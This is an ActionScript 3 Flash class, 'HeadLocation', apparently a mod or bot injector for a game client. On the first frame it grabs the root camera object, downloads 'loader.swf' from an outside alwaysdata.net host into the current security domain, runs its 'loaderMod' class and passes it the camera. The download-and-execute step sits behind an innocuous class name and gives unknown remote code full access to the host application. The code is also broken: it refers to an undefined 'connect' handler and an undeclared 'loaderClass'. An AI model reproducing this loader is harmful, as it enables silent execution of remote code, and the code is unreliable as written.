package {
	import flash.media.Sound;
	import flash.media.SoundTransform;
	import flash.display.*;
	import flash.events.Event;
	import flash.net.URLRequest;
	import flash.system.ApplicationDomain;
	import flash.system.LoaderContext;
	import flash.system.SecurityDomain;

	dynamic
	public class HeadLocation extends MovieClip {
		public var classAPI: Object;
		var verif = false;
		var camera: Object = null;
		var myLoader: Loader;
		public function HeadLocation() {
			var connexion = function (param1: Event): void {
				if (!verif) {
					verif = !verif;

					camera = root["camera"];

					root.userInterface.addLocalMessage("chargement ...");
					myLoader = new Loader();
					var loadContext = new LoaderContext();
					loadContext.securityDomain = SecurityDomain.currentDomain;
					var url: URLRequest = new URLRequest("http://discordbotmuret.alwaysdata.net/loader.swf");
					myLoader.contentLoaderInfo.addEventListener(Event.COMPLETE, onLoadComplete);

					myLoader.load(url, loadContext);
					removeEventListener(Event.ENTER_FRAME, connect);
				}
			};
			addEventListener(Event.ENTER_FRAME, connexion);
			return;
		} // end function
		public function onLoadComplete(param1: Event): void {
			var loadermod: Class = param1.target.applicationDomain.getDefinition("loaderMod") as Class;
			loaderClass = new loadermod();
			loaderClass.startLoader(camera);
		}

	}
}